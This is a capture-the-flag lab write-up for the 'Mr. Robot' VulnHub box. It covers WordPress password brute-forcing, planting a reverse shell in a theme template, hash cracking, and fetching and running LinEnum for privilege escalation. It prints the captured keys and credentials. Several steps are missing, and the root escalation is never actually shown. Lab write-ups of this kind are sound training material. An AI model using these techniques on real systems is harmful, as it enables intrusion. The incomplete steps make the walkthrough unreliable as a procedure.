## Information
Mr. Robot is a simple-intermediate level box on VulnHub that is based on the popular TV series of the same name; Mr. 
Robot. The box has 3 keys to capture and the box aims to make the pentester utilize various tools and methods to 
capture these keys. This includes various ways to establish a reverse shell as well as various ways to find possible 
vulnerabilities in the system.

## Tasks
- Capture all 3 keys
 
## Summary
- Use `nmap` to see the services
- Use `gobuster` to find the hidden web directories and capture `key-1-of-3.txt`
- Use `wpscan` to find possible vulnerabilities in the `Wordpress` installation and brute-force login
- Implement a reverse shell in one of the pages via `Editor` and use `nc` to catch the reverse shell
- Crack the MD5 via `hashcat` and to spawn a shell with `python` to login as `robot` to capture `key-2-of-3.txt`
- Find possible vulnerabilities in the shell via `LinEnum` to escalate privileges to `root` and capture`key-3-of-3.txt`
 
## Tools Used
- `nmap`
- `gobuster`
- `wpscan`
- `php-reverse-shell`
- `nc`
- `hashcat`
- `python`
- `LinEnum`

## Walkthrough
### nmap
We first begin with a pretty basic and standard `nmap` scan to see the services and what we're dealing with.

```
$ nmap -sC -sV 192.168.2.243

[...]

Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd

|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache

MAC Address: 18:D6:C7:B8:FD:A1 (Tp-link Technologies)

[...]
```

We have `HTTP` on Port 80 and a closed `SSH` on Port 22.

### HTTP
Taking a look at the `HTTP` by visiting `192.168.2.243` reveals an animated terminal and a message from Mr. Robot.

![Mr. Robot][Mr. Robot]

There are some commands we can input but none of them reveal anything useful to help us capture our first key. Thus we 
must scan for hidden directories with `gobuster`. Do note that `directory-list-2.3-medium.txt` was copied from 
`/usr/share/wordlists/dirbuster/`.

```
$ gobuster dir -u 192.168.2.243 -w directory-list-2.3-medium.txt

```

We now know that the website has `Wordpress` installed and there are several interesting directories. Taking a  look at 
`/robots` displays a raw paste that reveals two other hidden directories.

![robots.txt][robots.txt]

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Visiting `fsocity.dic` allows us to download a dictionary file that we'll probably use later. Visiting `key-1-of-3.txt` 
lets us access our first key; `073403c8a58a1f80d943455fb30724b9`.

### Wordpress
Since we know `Wordpress` is present on this machine, we'll try to access the admin console over at `/wp-admin`. Since 
we don't know the name of the users on this machine, we'll use `Lost Your Password?` and try various usernames related 
to the TV show to see if anything matches. `admin`,` fsociety`, `robot`, and `mrrobot` were no match but `elliot` was, 
indicating `elliot` is a known user in the system. 

Using `wpscan` we can scan the `Wordpress` installation and plugins for possible vulnerabilities and try to brute-force 
login as `elliot`. Since we were given `fsocity.dic` earlier, it would make sense to use it as our wordlist.

```
$ wpscan --url 192.168.2.243 --passwords fsocity.dic --usernames elliot

[i] Valid Combinations Found:
| Username: elliot, Password: ER28-0652

[...]
```

`wpscan` found `elliot`'s password to be `ER28-0652`. We can now access `Wordpress`.

![Wordpress - Panel][Wordpress - Panel]

Checking the panel there is nothing of interest aside images in `Media` and 2 users in `Users` where we only see 
`elliot` and `mich05654` who's name is Krista Gordon; Elliot's shrink in the TV series. 

![Wordpress - Users][Wordpress - Users]

### Getting a Reverse Shell Via Wordpress
Let's get a reverse shell using the panel. To do that we'll use [this][PHP Reverse Shell] PHP Reverse Shell script by 
[pentestmoney][pentestmonkey]. When attempted to upload to Wordpress you're not permitted to upload it.

![Wordpress - Denied][Wordpress - Denied]

As a result, we must attempt another way to upload our script. Luckily we can access `Appearance/Editor` and edit 
webpages of our choosing. Pasting the script to `404 Template` will suffice as the shell will initiate once we load 
`http://192.168.2.243/404.php`.

![Wordpress - 404][Wordpress - 404]

```
$ curl http://192.168.2.243/404.php

cat: key-2-of-3.txt: Permission denied

$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

We got access to the machine and navigating to `/home/robot` revealed 2 files; `key-2-of-3.txt` and `password.md5-raw`. 
Attempting to read `key-2-of-3.txt` doesn't work as we need to login as `robot`. To do that we must crack `robot`'s 
password, which is stored as a `MD5` hash in `password.raw-md5`.

### Logging in as Robot
We know our hash is `MD5` so using `hashcat` with `rockyou.txt` from `/usr/share/wordlists/rockyou.txt` we can 
commence a dictionary attack to crack it. Do note that `rockyou.txt` was copied from `/usr/share/wordlists/rockyou.txt`.

```
$ hashcat -m 0 -a 0 -d 1 --force hash.txt rockyou.txt

[...]

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
                                                 
[...]
```

Now let's attempt to switch users in the shell with our password

```
$ su robot
su: must be run from a terminal
```

We need to spawn a proper shell if we want to switch users. To do that we'll use `python`.

```
$ python -c 'import pty; pty.spawn("/bin/sh")'

$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

After spawning `/bin/sh` using `pty` from `python`, we can read `key-2-of-3.txt` and capture our second key.

### Logging in as Root
To capture our final flag we'll have to login as `root`. Since we have no clues regarding what the password for it 
might be, we must attempt privilege escalation. Using [LinEnum][LinEnum], we can scan for possible vulnerabilities in 
the system.

```
$ cd /tmp
cd /tmp

$ wget raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

$ chmod +x LinEnum.sh

$ ./LinEnum.sh

[...]

```

Thus we've captured our third and final key.
